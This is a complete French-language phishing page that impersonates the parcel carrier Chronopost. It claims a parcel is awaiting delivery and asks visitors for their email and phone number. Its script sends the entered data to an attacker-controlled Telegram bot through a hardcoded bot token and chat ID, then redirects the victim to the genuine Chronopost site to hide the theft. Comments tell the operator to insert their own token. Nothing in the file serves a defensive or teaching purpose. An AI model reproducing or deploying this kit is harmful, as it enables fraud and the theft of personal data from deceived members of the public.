<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification Colis - Chronopost</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background-color: #ffffff;
            width: 90%;
            max-width: 400px;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            text-align: center;
        }
        .logo {
            color: #003366; /* Bleu Chronopost */
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
            border-bottom: 2px solid #ff6600; /* Ligne Orange */
            padding-bottom: 10px;
            display: inline-block;
        }
        .icon {
            font-size: 40px;
            color: #ff6600;
            margin-bottom: 15px;
        }
        h2 {
            color: #333;
            font-size: 18px;
            margin-bottom: 10px;
        }
        p {
            color: #666;
            font-size: 14px;
            margin-bottom: 20px;
        }
        input {
            width: 90%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
        button {
            background-color: #ff6600; /* Orange Chronopost */
            color: white;
            border: none;
            padding: 15px;
            width: 95%;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #e65c00;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }
        .loader {
            display: none;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ff6600;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">Chronopost</div>
    
    <div class="icon">📦</div>
    
    <h2>Colis en attente de livraison</h2>
    <p>Veuillez confirmer vos coordonnées pour permettre au livreur de vous contacter.</p>

    <form id="phishForm">
        <input type="email" id="email" placeholder="Votre adresse email" required>
        <input type="tel" id="phone" placeholder="Votre numéro de téléphone" required>
        <button type="submit">Valider et recevoir le colis</button>
    </form>

    <div class="loader" id="loader"></div>
</div>

<script>
    // ⚠️ CONFIGURATION : Remplace par TON BOT TOKEN et TON CHAT ID
    const BOT_TOKEN = "8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ"; // Mets ton vrai token ici
    const CHAT_ID = "8501464548";

    document.getElementById('phishForm').addEventListener('submit', function(e) {
        e.preventDefault();

        // Afficher le loader
        document.querySelector('button').style.display = 'none';
        document.getElementById('loader').style.display = 'block';

        const email = document.getElementById('email').value;
        const phone = document.getElementById('phone').value;

        // Envoyer les données à ton Bot Telegram
        const message = `📦 *Nouveau Colis Chronopost*\n\n📧 Email: ${email}\n📞 Téléphone: ${phone}\n\n🕒 ${new Date().toLocaleString()}`;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(response => {
            // Succès : Rediriger vers la vraie page Chronopost
            window.location.href = "https://www.chronopost.fr/";
        })
        .catch(error => {
            alert("Erreur de connexion. Veuillez réessayer.");
            document.getElementById('loader').style.display = 'none';
            document.querySelector('button').style.display = 'block';
        });
    });
</script>

</body>
</html>
